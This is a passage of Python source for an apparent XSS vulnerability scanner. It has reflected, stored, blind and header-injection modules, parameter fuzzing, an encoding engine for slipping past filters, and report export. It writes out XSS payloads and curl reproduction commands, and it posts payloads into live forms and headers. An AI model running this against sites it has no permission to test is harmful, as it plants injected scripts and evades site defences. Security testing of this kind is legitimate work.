                        found_any = True
                        break

                    # Encoding retry: if payload was likely blocked/filtered, try encoded variants
                    if r and r.status_code in (200, 302) and payload not in r.text:
                        ok, working, wr = EncodingRetry.retry_with_encodings(
                            self.http, self._inject, self._check_exact, payload, pt, max_variants=3)
                        if ok:
                            self.sent += 3
                            v = {
                                'xss_type': 'Reflected', 'severity': 'HIGH',
                                'url': pt.form_action or pt.url, 'method': pt.method,
                                'parameter': pt.param_name, 'param_type': pt.param_type,
                                'payload': working, 'context': ctx_type,
                                'evidence': self._evidence(wr.text, working),
                                'page_found_on': pt.url,
                                'manual_test': self._manual_test(pt, working),
                                'note': f'Encoding bypass of original: {trunc(payload, 50)}',
                            }
                            self.vulns.append(v)
                            vuln_msg(f"Reflected XSS (encoded) → {Fore.YELLOW}{pt.param_name}{RESET} "
                                     f"@ {trunc(pt.form_action or pt.url, 50)} [{ctx_type}]")
                            found_any = True
                            break

                    if self.delay:
                        time.sleep(self.delay)
                if found_any:
                    break  # one confirmed vuln per injection point is enough
        print()
        return self.vulns

    def _inject(self, pt, payload):
        """Submit the payload via the correct HTTP method, with smart form filling."""
        if pt.method == 'GET':
            if pt.param_type == 'url_param':
                return self.http.get(replace_url_param(pt.url, pt.param_name, payload))
            else:
                d = self._fill_form(pt, payload)
                return self.http.get(pt.form_action or pt.url, params=d)
        else:
            d = self._fill_form(pt, payload)
            return self.http.post(pt.form_action or pt.url, data=d)

    def _check_exact(self, html, payload):
        """Check if the EXACT payload string appears unescaped in the response HTML."""
        return payload in html

    def _evidence(self, html, payload):
        pos = html.find(payload)
        if pos == -1:
            return ''
        return html[max(0, pos - 80):pos + len(payload) + 80]

    def _manual_test(self, pt, payload):
        """Generate a manual reproduction command."""
        if pt.method == 'GET':
            if pt.param_type == 'url_param':
                test_url = replace_url_param(pt.url, pt.param_name, payload)
                return f'curl -s "{test_url}" | grep -i "alert"'
            else:
                d = self._fill_form(pt, payload)
                qs = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in d.items())
                return f'Open: {pt.form_action or pt.url}?{qs}'
        else:
            d = self._fill_form(pt, payload)
            fields = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in d.items())
            return f'curl -s -X POST -d "{fields}" "{pt.form_action or pt.url}" | grep -i "alert"'


# ═══════════════════════════════════════════════════════════════════════
# STORED XSS SCANNER
# ═══════════════════════════════════════════════════════════════════════

class StoredScanner:
    """
    Smart stored XSS scanner that auto-fills form fields with realistic
    fake data (temp email, phone, name, address, etc.) so that form
    submissions are accepted by the server — not rejected for empty fields.
    """

    # ── Fake data pools for smart form-filling ───────────────────────
    FAKE_NAMES     = ['John Smith','Alice Johnson','Bob Lee','Sarah Connor','James Brown',
                      'Emily Davis','Michael Wilson','Jessica Taylor','David Martinez','Laura Garcia']
    FAKE_EMAILS    = ['testuser93@tempmail.com','scanbot7@mailnesia.com','xsstest42@guerrillamail.info',
                      'pentest1@yopmail.com','bugbounty@throwaway.email','sectest@tempail.com',
                      'hunter21@dispostable.com','vuln_scan@tempr.email']
    FAKE_PHONES    = ['+14155551234','+442071234567','+919876543210','555-0123','(555) 987-6543']
    FAKE_ADDRESSES = ['123 Security Blvd, Pentest City, CA 90210',
                      '456 Bug Bounty Lane, Hackerville, NY 10001',
                      '789 Vuln Street, Suite 42, London EC1A 1BB']
    FAKE_URLS      = ['https://www.example.com','https://test-site.org','https://pentest-demo.com']
    FAKE_COMPANIES = ['SecureTech Inc','BugBounty Corp','PentestLab LLC','CyberSafe Solutions']
    FAKE_PASSWORDS = ['TestPass123!','SecureP@ss456','Demo#Pass789']
    FAKE_USERNAMES = ['testuser93','scanbot7','pentest_user','bugfinder42','xss_hunter']
    FAKE_MESSAGES  = [
        'This is a test message for security validation purposes.',
        'Hello, I am testing the form submission functionality.',
        'Great service! I wanted to leave some feedback here.',
        'Just checking if this feature works correctly. Thanks!',
    ]
    FAKE_SUBJECTS  = ['Test Message','Feedback','Question','General Inquiry','Support Request']

    # Map input types / name patterns → fake data category
    _FIELD_MAP = {
        'email':    lambda self: random.choice(self.FAKE_EMAILS),
        'mail':     lambda self: random.choice(self.FAKE_EMAILS),
        'e-mail':   lambda self: random.choice(self.FAKE_EMAILS),
        'name':     lambda self: random.choice(self.FAKE_NAMES),
        'fullname': lambda self: random.choice(self.FAKE_NAMES),
        'full_name':lambda self: random.choice(self.FAKE_NAMES),
        'firstname':lambda self: random.choice(self.FAKE_NAMES).split()[0],
        'first_name':lambda self: random.choice(self.FAKE_NAMES).split()[0],
        'lastname': lambda self: random.choice(self.FAKE_NAMES).split()[-1],
        'last_name':lambda self: random.choice(self.FAKE_NAMES).split()[-1],
        'phone':    lambda self: random.choice(self.FAKE_PHONES),
        'tel':      lambda self: random.choice(self.FAKE_PHONES),
        'mobile':   lambda self: random.choice(self.FAKE_PHONES),
        'telephone':lambda self: random.choice(self.FAKE_PHONES),
        'address':  lambda self: random.choice(self.FAKE_ADDRESSES),
        'city':     lambda self: 'Pentest City',
        'state':    lambda self: 'California',
        'country':  lambda self: 'United States',
        'zip':      lambda self: '90210',
        'zipcode':  lambda self: '90210',
        'postal':   lambda self: '90210',
        'url':      lambda self: random.choice(self.FAKE_URLS),
        'website':  lambda self: random.choice(self.FAKE_URLS),
        'homepage': lambda self: random.choice(self.FAKE_URLS),
        'company':  lambda self: random.choice(self.FAKE_COMPANIES),
        'organization': lambda self: random.choice(self.FAKE_COMPANIES),
        'username': lambda self: random.choice(self.FAKE_USERNAMES),
        'user':     lambda self: random.choice(self.FAKE_USERNAMES),
        'login':    lambda self: random.choice(self.FAKE_USERNAMES),
        'password': lambda self: random.choice(self.FAKE_PASSWORDS),
        'pass':     lambda self: random.choice(self.FAKE_PASSWORDS),
        'passwd':   lambda self: random.choice(self.FAKE_PASSWORDS),
        'confirm_password': lambda self: random.choice(self.FAKE_PASSWORDS),
        'message':  lambda self: random.choice(self.FAKE_MESSAGES),
        'comment':  lambda self: random.choice(self.FAKE_MESSAGES),
        'text':     lambda self: random.choice(self.FAKE_MESSAGES),
        'body':     lambda self: random.choice(self.FAKE_MESSAGES),
        'content':  lambda self: random.choice(self.FAKE_MESSAGES),
        'feedback': lambda self: random.choice(self.FAKE_MESSAGES),
        'description':lambda self: random.choice(self.FAKE_MESSAGES),
        'review':   lambda self: random.choice(self.FAKE_MESSAGES),
        'note':     lambda self: random.choice(self.FAKE_MESSAGES),
        'notes':    lambda self: random.choice(self.FAKE_MESSAGES),
        'subject':  lambda self: random.choice(self.FAKE_SUBJECTS),
        'title':    lambda self: random.choice(self.FAKE_SUBJECTS),
        'age':      lambda self: str(random.randint(18,65)),
        'number':   lambda self: str(random.randint(1,100)),
        'quantity': lambda self: str(random.randint(1,10)),
        'amount':   lambda self: str(random.randint(1,999)),
    }

    def __init__(self, http, payloads, custom_payloads, delay=0):
        self.http = http
        self.payloads = payloads
        self.custom = custom_payloads
        self.delay = delay
        self.ctx = ContextAnalyzer()
        self.vulns = []
        self.sent = 0

    def _smart_fill(self, field_name, input_type=None, current_value=None):
        """
        Return a realistic fake value for a form field based on its
        name, type, and current value. This ensures form submissions
        are accepted by the server.  Always overwrite for target-candidate
        fields (text, message, comment, name, etc.) to allow canary testing.
        """
        fn = field_name.lower().replace('-','_').replace(' ','_')

        # Keep pre-filled values ONLY for truly static fields (hidden tokens, CSRF, etc.)
        # But NOT for user-writable fields that we might want to test
        user_writable = ('text','message','comment','body','content','name','fullname',
                         'email','phone','address','subject','title','feedback','review',
                         'note','notes','description','uname','urname','uuname','uemail',
                         'uphone','uaddress','ucc','username','user','login')
        if current_value and current_value.strip() and fn not in user_writable:
            return current_value

        # Check by HTML input type attribute first
        if input_type:
            it = input_type.lower()
            if it == 'email': return random.choice(self.FAKE_EMAILS)
            if it == 'tel':   return random.choice(self.FAKE_PHONES)
            if it == 'url':   return random.choice(self.FAKE_URLS)
            if it == 'number':return str(random.randint(1,100))
            if it == 'password': return random.choice(self.FAKE_PASSWORDS)
            if it == 'submit': return current_value or 'Submit'

        # Check by field name (exact match)
        if fn in self._FIELD_MAP:
            return self._FIELD_MAP[fn](self)

        # Check by field name (partial match)
        for key, gen in self._FIELD_MAP.items():
            if key in fn:
                return gen(self)

        # Fallback for textarea-like
        if input_type and input_type.lower() in ('textarea', 'form_textarea'):
            return random.choice(self.FAKE_MESSAGES)

        # Generic fallback
        return f"test_{uid(5)}"

    def _fill_form(self, pt, payload):
        """
        Build a complete form submission dict with the payload in the
        target field and realistic fake data in ALL other fields.
        """
        d = {}
        for field_name, field_val in pt.form_data.items():
            if field_name == pt.param_name:
                d[field_name] = payload
            else:
                # Smart-fill based on name/type/value
                itype = None
                d[field_name] = self._smart_fill(field_name, itype, field_val)
        # Make sure our target field is present
        d[pt.param_name] = payload
        return d

    def _dedup_points(self, points):
        """Deduplicate stored points: same (action_path, param_name) → test once."""
        seen = set()
        unique = []
        for pt in points:
            action = pt.form_action or pt.url
            action_path = urlparse(action).path
            key = (action_path, pt.param_name, pt.method)
            if key not in seen:
                seen.add(key)
                unique.append(pt)
        return unique

    def scan(self, points, pages):
        storable = [p for p in points if p.method == 'POST' or p.param_type in ('form_textarea', 'form_input', 'hidden')]
        storable = self._dedup_points(storable)

        # Filter out submit buttons and non-data fields
        storable = [p for p in storable if p.param_name.lower() not in ('submit', 'gobutton', 'go', 'btn', 'button', 'signup')]

        if not storable:
            dim("No storable forms found — skipping stored XSS.")
            return []

        total = len(storable)
        for idx, pt in enumerate(storable):
            progress_bar(idx + 1, total, label=f"stored:{pt.param_name}@{trunc(urlparse(pt.url).path,25)}")

            # ── Phase 1: Submit a unique canary to test persistence ──
            probe = canary("sxss") + uid(6)
            form_data = self._fill_form(pt, probe)
            target_url = pt.form_action or pt.url
            post_resp = self._submit_data(target_url, pt.method, form_data)
            self.sent += 1
            time.sleep(max(self.delay, 0.5))

            # ── Phase 2: Check if canary appears ANYWHERE ──
            # First: check the POST response itself (many forms reflect immediately)
            found_on = None
            found_resp = None

            if post_resp and probe in post_resp.text:
                found_on = target_url
                found_resp = post_resp

            # Second: check GET on the form page, action URL, and other crawled pages
            if not found_on:
                check_pages = list(OrderedDict.fromkeys([
                    pt.url,                          # page the form is on
                    target_url,                      # form action URL
                ] + pages[:15]))[:20]

                for pg in check_pages:
                    r = self.http.get(pg)
                    if r and probe in r.text:
                        found_on = pg
                        found_resp = r
                        break

            if not found_on:
                continue

            is_post_reflection = (found_resp is post_resp)
            persist_type = "POST response (immediate)" if is_post_reflection else "persistent (GET)"
            info(f"Canary found in {persist_type} on {Fore.CYAN}{trunc(found_on,50)}{RESET} — firing payloads...")

            # ── Phase 3: Analyze context and fire real payloads ──
            contexts = self.ctx.analyze(found_resp.text, probe)

            for ctx_type, _ in (contexts or [('html_text', '')]):
                ctx_specific = CONTEXT_PAYLOADS.get(ctx_type, BASIC_PAYLOADS[:15])
                test_set = list(OrderedDict.fromkeys(
                    ctx_specific[:20] + self.custom[:5] + self.payloads[:15]
                ))

                found_vuln = False
                for payload in test_set:
                    form_data = self._fill_form(pt, payload)
                    resp = self._submit_data(target_url, pt.method, form_data)
                    self.sent += 1
                    time.sleep(max(self.delay, 0.3))

                    # Check 1: payload in POST response (immediate reflection / stored-and-reflected)
                    if resp and payload in resp.text:
                        v = {
                            'xss_type': 'Stored', 'severity': 'CRITICAL',
                            'url': found_on, 'submission_url': target_url,
                            'method': pt.method, 'parameter': pt.param_name,
                            'param_type': pt.param_type, 'payload': payload,
                            'context': ctx_type,
                            'evidence': self._evidence(resp.text, payload),
                            'page_found_on': found_on,
                            'persist_type': persist_type,
                            'manual_test': self._manual_test(pt, payload, found_on, form_data),
                        }
                        self.vulns.append(v)
                        vuln_msg(f"Stored XSS → {Fore.YELLOW}{pt.param_name}{RESET} "
                                 f"on {trunc(found_on, 45)} [{ctx_type}] ({persist_type})")
                        found_vuln = True
                        break

                    # Check 2: payload persists on GET (true persistent stored XSS)
                    if not is_post_reflection:
                        r = self.http.get(found_on)
                        if r and payload in r.text:
                            v = {
                                'xss_type': 'Stored', 'severity': 'CRITICAL',
                                'url': found_on, 'submission_url': target_url,
                                'method': pt.method, 'parameter': pt.param_name,
                                'param_type': pt.param_type, 'payload': payload,
                                'context': ctx_type,
                                'evidence': self._evidence(r.text, payload),
                                'page_found_on': found_on,
                                'persist_type': 'persistent',
                                'manual_test': self._manual_test(pt, payload, found_on, form_data),
                            }
                            self.vulns.append(v)
                            vuln_msg(f"Stored XSS → {Fore.YELLOW}{pt.param_name}{RESET} "
                                     f"persists on {trunc(found_on, 45)} [{ctx_type}]")
                            found_vuln = True
                            break

                    if self.delay:
                        time.sleep(self.delay)
                if found_vuln:
                    break
        print()
        return self.vulns

    def _submit_data(self, url, method, data):
        """Submit form data using the correct HTTP method."""
        if method == 'POST':
            return self.http.post(url, data=data)
        else:
            return self.http.get(url, params=data)

    def _evidence(self, html, payload):
        pos = html.find(payload)
        return html[max(0, pos - 80):pos + len(payload) + 80] if pos != -1 else ''

    def _manual_test(self, pt, payload, found_on, form_data):
        escaped_payload = requests.utils.quote(payload)
        # Build the full curl command with ALL form fields
        all_fields = []
        for k, v in form_data.items():
            escaped_v = requests.utils.quote(str(v))
            all_fields.append(f"{k}={escaped_v}")
        fields_str = "&".join(all_fields)
        step1 = f'curl -s -X POST -d "{fields_str}" "{pt.form_action or pt.url}"'
        step2 = f'curl -s "{found_on}" | grep -i "alert"'
        return f"Step 1 (inject): {step1}\nStep 2 (verify): {step2}"


# ═══════════════════════════════════════════════════════════════════════
# BLIND XSS SCANNER
# ═══════════════════════════════════════════════════════════════════════

class BlindScanner:
    """
    Blind XSS scanner that injects callback payloads into form fields and
    HTTP headers. Uses smart form-filling so submissions are accepted.
    Deduplicates injection points.
    """

    # Fake data for filling non-target fields
    _FILL = {
        'email': 'scanbot@tempmail.com', 'mail': 'scanbot@tempmail.com',
        'name': 'Test User', 'fullname': 'Test User', 'full_name': 'Test User',
        'firstname': 'Test', 'first_name': 'Test', 'lastname': 'User', 'last_name': 'User',
        'phone': '5551234567', 'tel': '5551234567', 'mobile': '5551234567',
        'password': 'TestPass1!', 'pass': 'TestPass1!', 'passwd': 'TestPass1!',
        'upass': 'TestPass1!', 'upass2': 'TestPass1!', 'confirm_password': 'TestPass1!',
        'username': 'testuser', 'user': 'testuser', 'login': 'testuser',
        'uname': 'testuser', 'uuname': 'testuser',
        'message': 'Test message', 'text': 'Test message', 'comment': 'Test message',
        'body': 'Test message', 'content': 'Test message', 'feedback': 'Test message',
        'subject': 'Test', 'title': 'Test',
        'address': '123 Test St', 'uaddress': '123 Test St',
        'city': 'TestCity', 'state': 'CA', 'zip': '90210',
        'country': 'US', 'url': 'https://example.com', 'website': 'https://example.com',
        'company': 'TestCo', 'cc': '1234567890', 'ucc': '1234567890',
        'urname': 'Test User', 'uemail': 'scanbot@tempmail.com', 'uphone': '5551234567',
    }

    def __init__(self, http, callback_url, inject_headers=False, delay=0):
        self.http = http
        self.cb = callback_url
        self.inject_headers = inject_headers
        self.delay = delay
        self.log = []
        self.sent = 0

    def _fill_form(self, pt, payload):
        """Fill form with realistic data, target field gets blind payload."""
        d = {}
        for field, val in pt.form_data.items():
            if field == pt.param_name:
                d[field] = payload
            elif val and val.strip():
                d[field] = val
            else:
                fn = field.lower().replace('-','_').replace(' ','_')
                d[field] = self._FILL.get(fn, self._FILL.get(
                    next((k for k in self._FILL if k in fn), ''), f'test_{uid(4)}'))
        d[pt.param_name] = payload
        return d

    def _dedup_points(self, points):
        """Deduplicate: same (action_path, param_name) → test once."""
        seen = set()
        unique = []
        for pt in points:
            action = pt.form_action or pt.url
            key = (urlparse(action).path, pt.param_name, pt.method)
            if key not in seen:
                seen.add(key)
                unique.append(pt)
        return unique

    def scan(self, points, pages):
        payloads = blind_payloads(self.cb)
        if not payloads:
            warn("No callback URL — skipping blind XSS."); return []

        # Deduplicate and filter out submit buttons
        unique = self._dedup_points(points)
        unique = [p for p in unique if p.param_name.lower() not in ('submit', 'gobutton', 'go', 'btn', 'button', 'signup')]

        # Inject into form params with smart form filling
        total = len(unique) * len(payloads)
        count = 0
        for pt in unique:
            for p in payloads:
                count += 1
                tag = uid(8)
                tagged = p.replace(self.cb, f"{self.cb}?t={tag}&p={pt.param_name}")
                progress_bar(count, total, label=f"blind:{pt.param_name}")
                d = self._fill_form(pt, tagged)
                t = pt.form_action or pt.url
                r = self.http.post(t, data=d) if pt.method=='POST' else self.http.get(t, params=d)
                self.sent += 1
                self.log.append({'tag':tag,'param':pt.param_name,'url':pt.url,'payload':tagged,'type':'form'})
                if self.delay: time.sleep(self.delay)
        print()

        # Inject into headers
        if self.inject_headers:
            info("Injecting blind payloads into HTTP headers...")
            for pg in pages[:20]:
                for hdr in INJECTABLE_HEADERS:
                    for p in payloads[:3]:
                        tag = uid(8)
                        tagged = p.replace(self.cb, f"{self.cb}?t={tag}&h={hdr}")
                        self.http.get_custom_headers(pg, {hdr: tagged})
                        self.sent += 1
                        self.log.append({'tag':tag,'header':hdr,'url':pg,'payload':tagged,'type':'header'})

        # Save log
        os.makedirs('output', exist_ok=True)
        with open('output/blind_injections.json','w') as f:
            json.dump(self.log, f, indent=2)
        info(f"Blind injection log → output/blind_injections.json ({len(self.log)} entries)")
        return self.log


# ═══════════════════════════════════════════════════════════════════════
# HEADER INJECTION SCANNER — tests reflection in HTTP response headers
# ═══════════════════════════════════════════════════════════════════════

class HeaderInjectionScanner:
    """
    Tests if XSS payloads injected into HTTP request headers (Referer,
    User-Agent, X-Forwarded-For, etc.) are reflected in response body.
    Many modern apps log/display these values without sanitization.
    """

    def __init__(self, http, delay=0):
        self.http = http
        self.delay = delay
        self.ctx = ContextAnalyzer()
        self.vulns = []
        self.sent = 0

    def scan(self, pages):
        if not pages:
            return []

        # Test first 15 pages max
        test_pages = pages[:15]
        total = len(test_pages) * len(INJECTABLE_HEADERS)
        count = 0

        for page in test_pages:
            for hdr_name in INJECTABLE_HEADERS:
                count += 1
                progress_bar(count, total, label=f"hdr:{hdr_name[:15]}@{trunc(urlparse(page).path,20)}")

                probe = canary("hxss")
                try:
                    resp = self.http.get_custom_headers(page, {hdr_name: probe})
                    self.sent += 1
                except Exception:
                    continue

                if not resp or probe not in resp.text:
                    continue

                # Header value reflects — try real payloads
                contexts = self.ctx.analyze(resp.text, probe)
                ctx_type = contexts[0][0] if contexts else 'html_text'
                test_payloads = [
                    '<script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '" onmouseover="alert(1)" x="',
                    "' onmouseover='alert(1)' x='",
                    '</script><script>alert(1)</script>',
                ]
                for payload in test_payloads:
                    r = self.http.get_custom_headers(page, {hdr_name: payload})
                    self.sent += 1
                    if r and payload in r.text:
                        v = {
                            'xss_type': 'Header Injection',
                            'severity': 'HIGH',
                            'url': page,
                            'method': 'GET',
                            'parameter': f"Header: {hdr_name}",
                            'param_type': 'http_header',
                            'payload': payload,
                            'context': ctx_type,
                            'evidence': self._evidence(r.text, payload),
                            'page_found_on': page,
                            'manual_test': f'curl -s -H "{hdr_name}: {payload}" "{page}" | grep -i "alert"',
                        }
                        self.vulns.append(v)
                        vuln_msg(f"Header XSS → {Fore.YELLOW}{hdr_name}{RESET} "
                                 f"@ {trunc(page, 50)} [{ctx_type}]")
                        break
                    if self.delay:
                        time.sleep(self.delay)
        print()
        return self.vulns

    def _evidence(self, html, payload):
        pos = html.find(payload)
        return html[max(0, pos - 80):pos + len(payload) + 80] if pos != -1 else ''


# ═══════════════════════════════════════════════════════════════════════
# PARAMETER DISCOVERY — find hidden/undocumented parameters
# ═══════════════════════════════════════════════════════════════════════

class ParamDiscovery:
    """
    Discover hidden parameters by fuzzing common param names and checking
    if they reflect in the response. Finds attack surface missed by crawling.
    """

    def __init__(self, http, delay=0):
        self.http = http
        self.delay = delay
        self.discovered = []

    def discover(self, pages):
        """Try PARAM_DISCOVERY_WORDLIST on each page, return new InjectionPoints."""
        if not pages:
            return []

        # Test first 10 pages to keep it fast
        test_pages = pages[:10]
        total = len(test_pages) * len(PARAM_DISCOVERY_WORDLIST)
        count = 0
        new_points = []
        seen = set()

        for page in test_pages:
            page_base = extract_base_url(page) + urlparse(page).path
            for param in PARAM_DISCOVERY_WORDLIST:
                count += 1
                if count % 20 == 0:
                    progress_bar(count, total, label=f"discover:{param}@{trunc(urlparse(page).path,20)}")

                probe = canary("disc")
                test_url = f"{page_base}?{param}={probe}"
                key = (urlparse(page).path, param)
                if key in seen:
                    continue
                seen.add(key)

                try:
                    resp = self.http.get(test_url)
                except Exception:
                    continue

                if resp and probe in resp.text:
                    # This parameter reflects!
                    pt = InjectionPoint(test_url, 'GET', param, 'url_param')
                    new_points.append(pt)
                    self.discovered.append({'page': page, 'param': param, 'url': test_url})

                if self.delay:
                    time.sleep(self.delay)

        progress_bar(total, total, label="discovery complete")
        print()
        return new_points


# ═══════════════════════════════════════════════════════════════════════
# ENCODING RETRY ENGINE — auto-retry with encoding variations
# ═══════════════════════════════════════════════════════════════════════

class EncodingRetry:
    """
    When a payload is blocked, automatically retry with various encoding
    transformations: URL encode, double encode, unicode, HTML entities, etc.
    """

    @staticmethod
    def get_variants(payload):
        """Generate encoded variants of a payload."""
        variants = []

        # 1. URL encode
        variants.append(requests.utils.quote(payload))

        # 2. Double URL encode
        variants.append(requests.utils.quote(requests.utils.quote(payload)))

        # 3. Unicode escape (JS context)
        uni = ''
        for ch in payload:
            if ch.isalpha():
                uni += f'\\u{ord(ch):04x}'
            else:
                uni += ch
        variants.append(uni)

        # 4. HTML entity encode (decimal)
        ent = ''.join(f'&#{ord(c)};' for c in payload)
        variants.append(ent)

        # 5. HTML entity encode (hex)
        ent_hex = ''.join(f'&#x{ord(c):x};' for c in payload)
        variants.append(ent_hex)

        # 6. Mixed case (for tag/event names)
        mixed = ''
        for i, ch in enumerate(payload):
            mixed += ch.upper() if i % 2 else ch.lower()
        variants.append(mixed)

        # 7. Tab/newline insertion in tags
        variants.append(payload.replace('<', '<\t').replace('=', '\t='))
        variants.append(payload.replace(' ', '\n'))

        # 8. Null byte insertion
        variants.append(payload.replace('<', '\x00<'))

        # Remove duplicates and the original
        return list(OrderedDict.fromkeys(v for v in variants if v != payload and v.strip()))

    @staticmethod
    def retry_with_encodings(http, inject_fn, check_fn, payload, pt, max_variants=5):
        """
        Try encoded variants of a payload. Returns (success:bool, working_payload, response).
        inject_fn(pt, payload) → response
        check_fn(html, payload) → bool
        """
        variants = EncodingRetry.get_variants(payload)[:max_variants]
        for variant in variants:
            resp = inject_fn(pt, variant)
            if resp and check_fn(resp.text, variant):
                return True, variant, resp
        return False, None, None


# ═══════════════════════════════════════════════════════════════════════
# EMAIL ALERTING
# ═══════════════════════════════════════════════════════════════════════

class EmailAlert:
    def __init__(self, smtp_host, smtp_port, smtp_user, smtp_pass, recipient):
        self.host = smtp_host; self.port = smtp_port
        self.user = smtp_user; self.pwd = smtp_pass; self.to = recipient

    def send(self, subject, body_html):
        try:
            msg = MIMEMultipart('alternative')
            msg['From']=self.user; msg['To']=self.to; msg['Subject']=subject
            msg.attach(MIMEText(body_html,'html'))
            ctx = ssl.create_default_context()
            with smtplib.SMTP(self.host, self.port) as srv:
                srv.starttls(context=ctx); srv.login(self.user, self.pwd); srv.send_message(msg)
            return True
        except Exception as e:
            error(f"Email failed: {e}"); return False


# ═══════════════════════════════════════════════════════════════════════
# HTML REPORT GENERATOR — gorgeous dark-themed report
# ═══════════════════════════════════════════════════════════════════════

def export_json(target, vulns, stats):
    """Export vulnerabilities as JSON for CI/CD pipelines."""
    os.makedirs('output', exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fp = f"output/xss_results_{ts}.json"
    report = {
        'scanner': 'XSS Hunter Pro v3.0',
        'target': target,
        'timestamp': datetime.datetime.now().isoformat(),
        'stats': stats,
        'vulnerabilities_count': len(vulns),
        'vulnerabilities': [],
    }
    for v in vulns:
        report['vulnerabilities'].append({
            'type': v.get('xss_type', ''),
            'severity': v.get('severity', ''),
            'url': v.get('url', ''),
            'method': v.get('method', ''),
            'parameter': v.get('parameter', ''),
            'param_type': v.get('param_type', ''),
            'payload': v.get('payload', ''),
            'context': v.get('context', ''),
            'evidence': v.get('evidence', '')[:500],
            'manual_test': v.get('manual_test', ''),
            'note': v.get('note', ''),
        })
    with open(fp, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    return fp

def export_csv(target, vulns):
    """Export vulnerabilities as CSV."""
    os.makedirs('output', exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fp = f"output/xss_results_{ts}.csv"
    headers = ['#', 'Type', 'Severity', 'URL', 'Method', 'Parameter', 'Param_Type',
               'Payload', 'Context', 'Manual_Test']
    with open(fp, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        for i, v in enumerate(vulns, 1):
            writer.writerow([
                i, v.get('xss_type', ''), v.get('severity', ''),
                v.get('url', ''), v.get('method', ''), v.get('parameter', ''),
                v.get('param_type', ''), v.get('payload', ''),
                v.get('context', ''), v.get('manual_test', ''),
            ])
    return fp

def generate_report(target, vulns, pages, points, stats, scan_log):
    os.makedirs('output', exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fp = f"output/xss_report_{ts}.html"

    # Build crawled pages section
    pages_rows = ""
    for i, pg in enumerate(pages, 1):
        pts = [p for p in points if p.url == pg]
        form_pts = [p for p in pts if 'form' in p.param_type or p.param_type == 'hidden']
        url_pts  = [p for p in pts if p.param_type == 'url_param']
        vuln_here = [v for v in vulns if v.get('url') == pg or v.get('page_found_on') == pg]
        status_icon = "🔴" if vuln_here else "🟢"
        pages_rows += f"""<tr>
            <td>{i}</td><td>{status_icon}</td>
            <td style="word-break:break-all"><a href="{html_esc(pg)}" target="_blank" style="color:#58a6ff">{html_esc(pg)}</a></td>
            <td style="text-align:center">{len(url_pts)}</td>
            <td style="text-align:center">{len(form_pts)}</td>
            <td style="text-align:center;color:{'#f85149' if vuln_here else '#3fb950'}">{len(vuln_here)}</td>
        </tr>"""

    # Build vulns section
    vuln_cards = ""
    for i, v in enumerate(vulns, 1):
        sev_color = '#f85149' if v.get('severity')=='CRITICAL' else '#f0883e' if v.get('severity')=='HIGH' else '#d29922'
        manual = html_esc(v.get('manual_test',''))
        vuln_cards += f"""
        <div class="vuln-card">
            <div class="vuln-header">
                <span class="vuln-num">#{i}</span>
                <span class="vuln-badge" style="background:{sev_color}">{html_esc(v.get('xss_type',''))}</span>
                <span class="vuln-sev" style="color:{sev_color}">{html_esc(v.get('severity',''))}</span>
            </div>
            <table class="vuln-detail">
                <tr><td class="vd-label">URL</td><td class="vd-value"><a href="{html_esc(v.get('url',''))}" target="_blank" style="color:#58a6ff">{html_esc(v.get('url',''))}</a></td></tr>
                <tr><td class="vd-label">Parameter</td><td class="vd-value"><code>{html_esc(v.get('parameter',''))}</code> <span style="color:#8b949e">({html_esc(v.get('param_type',''))})</span></td></tr>
                <tr><td class="vd-label">Method</td><td class="vd-value">{html_esc(v.get('method',''))}</td></tr>
                <tr><td class="vd-label">Context</td><td class="vd-value"><code>{html_esc(v.get('context',''))}</code></td></tr>
                <tr><td class="vd-label">Payload</td><td class="vd-value"><code class="payload-code">{html_esc(v.get('payload',''))}</code></td></tr>
                <tr><td class="vd-label">Evidence</td><td class="vd-value"><pre class="evidence">{html_esc(trunc(v.get('evidence',''),300))}</pre></td></tr>
                <tr><td class="vd-label">🧪 Manual Test</td><td class="vd-value"><pre class="manual-cmd">{manual}</pre></td></tr>
            </table>
        </div>"""

    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS Hunter Pro — Report</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}}
.wrap{{max-width:1300px;margin:0 auto;padding:20px 30px}}
h1{{color:#f85149;font-size:1.8rem;margin-bottom:4px}}
h2{{color:#58a6ff;margin:35px 0 12px;font-size:1.3rem;border-bottom:1px solid #21262d;padding-bottom:8px}}
.sub{{color:#8b949e;margin-bottom:25px}}
.disc{{background:#1c1206;border:1px solid #d29922;border-radius:8px;padding:12px 16px;margin:15px 0;color:#d29922;font-size:.9rem}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:12px;margin:15px 0}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px;text-align:center}}
.card .num{{font-size:2.2rem;font-weight:700;color:#58a6ff}}
.card .lbl{{color:#8b949e;font-size:.85rem;margin-top:3px}}
.card.danger .num{{color:#f85149}}.card.warn .num{{color:#d29922}}.card.ok .num{{color:#3fb950}}
table.main{{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden;margin:10px 0}}
table.main th{{background:#21262d;color:#58a6ff;padding:10px 14px;text-align:left;font-weight:600;font-size:.85rem}}
table.main td{{padding:8px 14px;border-top:1px solid #21262d;font-size:.85rem}}
table.main tr:hover{{background:#1c2128}}
.vuln-card{{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px;margin:14px 0}}
.vuln-header{{display:flex;align-items:center;gap:12px;margin-bottom:14px}}
.vuln-num{{font-size:1.1rem;font-weight:700;color:#c9d1d9}}
.vuln-badge{{padding:3px 12px;border-radius:12px;color:#fff;font-size:.8rem;font-weight:700}}
.vuln-sev{{font-weight:700;font-size:.9rem}}
.vuln-detail{{width:100%;border-collapse:collapse}}
